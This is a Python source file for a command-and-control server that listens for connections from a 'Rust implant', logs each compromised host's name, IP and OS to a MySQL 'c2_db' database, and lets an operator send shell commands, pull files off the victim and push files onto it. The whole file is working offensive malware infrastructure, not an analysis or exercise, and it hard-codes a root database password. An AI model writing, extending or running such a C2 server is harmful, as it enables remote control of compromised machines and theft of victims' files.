import socket
import pymysql
import json
import select
import threading

# MySQL connection details
MYSQL_HOST = 'localhost'
MYSQL_USER = 'root'
MYSQL_PASSWORD = 'jcac'
MYSQL_DB = 'c2_db'

# Connect to MySQL database
db_conn = pymysql.connect(
    host=MYSQL_HOST,
    user=MYSQL_USER,
    password=MYSQL_PASSWORD,
    db=MYSQL_DB,
)
cursor = db_conn.cursor()

RUST_IMPLANT_ADDR = '0.0.0.0'
RUST_IMPLANT_PORT = 5000

# Create a TCP socket to listen for the Rust implant
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
    sock.bind((RUST_IMPLANT_ADDR, RUST_IMPLANT_PORT))
    sock.listen(1)
    print(f"Listening for connections from the Rust implant on {RUST_IMPLANT_ADDR}:{RUST_IMPLANT_PORT}...")

    # Accept a connection from the Rust implant
    conn, addr = sock.accept()
    print(f"Connection established with Rust implant at {addr[0]}:{addr[1]}")

    # Receive implant information
    data = conn.recv(1024)
    if b'\0' in data:
        index = data.index(b'\0')
        data = data[:index].decode('utf-8')
        try:
            implant_data = json.loads(data)
            print("Implant information received:")
            print(json.dumps(implant_data, indent=2))

            implant_id = implant_data.get("implant_id")
            hostname = implant_data.get("hostname")
            ip_address = implant_data.get("ip_address")
            os = implant_data.get("os")
            first_seen = implant_data.get("first_seen")
            last_seen = implant_data.get("last_seen")

            query = "INSERT INTO implants (implant_id, hostname, ip_address, os, first_seen, last_seen) VALUES (%s, %s, %s, %s, %s, %s)"
            cursor.execute(query, (implant_id, hostname, ip_address, os, first_seen, last_seen))
            db_conn.commit()
            print("Implant information registered successfully.")
        except json.JSONDecodeError:
            print("Invalid implant information received.")
    else:
        print("Failed to receive implant information.")

    def receive_output(conn):
        while True:
            data = conn.recv(1024)
            if b'\0' in data:
                index = data.index(b'\0')
                output = data[:index].decode('utf-8')
                print("Output from the Rust implant:")
                print(output)
                return output
            else:
                output = data.decode('utf-8')
                print(output)
                return output

    # Start a thread to receive output from the Rust implant
    output_thread = threading.Thread(target=receive_output, args=(conn,))
    output_thread.setDaemon(True)
    output_thread.start()

    while True:
        # Prompt the user for a command to send to the Rust implant
        command = input("Enter command: ")

        if not command.strip():
            print("Empty command. Please enter a valid command.")
            continue

        # Send the command to the Rust implant
        conn.sendall(command.encode('utf-8'))
        conn.sendall(b'\0')  # Send the null byte after the command

        if command.startswith("download "):
            parts = command.split()
            if len(parts) == 3:
                output = output_thread.join()
                # Save the output to the specified file
                with open(parts[2], "wb") as file:
                    while True:
                        # Receive data from the Rust implant
                        data = conn.recv(1024)

                        # Check if the received data contains the sentinel value
                        if b'\0' in data:
                            # Find the index of the sentinel value
                            index = data.index(b'\0')

                            # Write the data up to the sentinel value into the file
                            file.write(data[:index])

                            # Break the loop as the file transfer is complete
                            break
                        else:
                            file.write(data)
                    print(f"File '{parts[1]}' downloaded and saved to '{parts[2]}'")
            else:
                print("Invalid command format. Expected format: download <file_name> <destination>")

        elif command.startswith("push "):
            parts = command.split()
            if len(parts) == 3:
                # Read the file to be pushed to the implant
                with open(parts[1], "rb") as file:
                    file_data = file.read()

                    # Send the file data to the Rust implant
                    conn.sendall(file_data)
                    conn.sendall(b'\0')  # Send the sentinel value after the file data
            else:
                print("Invalid command format. Expected format: push <source_file> <destination_file>")

        else:
            # Wait for the output thread to finish receiving the output
            output_thread.join()
